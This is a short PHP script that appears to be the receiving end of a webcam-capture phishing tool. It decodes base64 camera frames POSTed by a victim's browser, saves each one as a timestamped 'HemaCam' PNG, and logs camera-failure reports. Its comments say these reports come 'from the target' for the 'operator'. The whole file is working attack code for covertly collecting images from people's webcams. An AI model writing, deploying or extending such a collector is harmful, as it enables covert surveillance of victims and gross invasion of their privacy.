<?php
$data = isset($_POST['cat']) ? $_POST['cat'] : '';

// Webcam frame (base64 data URL) -> unique filename with milliseconds, no overwrites
if (strpos($data, 'base64,') !== false) {
    $date = date('dMYHis');
    $ms = str_pad((string)(int)((microtime(true) - floor(microtime(true))) * 1000), 3, '0', STR_PAD_LEFT);
    $filtered = substr($data, strpos($data, ',') + 1);
    $unencoded = base64_decode($filtered, true);
    if ($unencoded !== false) {
        $name = 'HemaCam-' . $date . '-' . $ms . '.png';
        $fp = @fopen($name, 'wb');
        if ($fp) { fwrite($fp, $unencoded); fclose($fp); }
        @file_put_contents('log.txt', $date . "\r\n", FILE_APPEND);
    }
}
// Camera failure report from the target (so the operator sees WHY nothing arrives)
elseif (strpos($data, 'CAMERA_ERROR') === 0) {
    @file_put_contents('errlog.txt', $data . "\r\n", FILE_APPEND);
}

exit();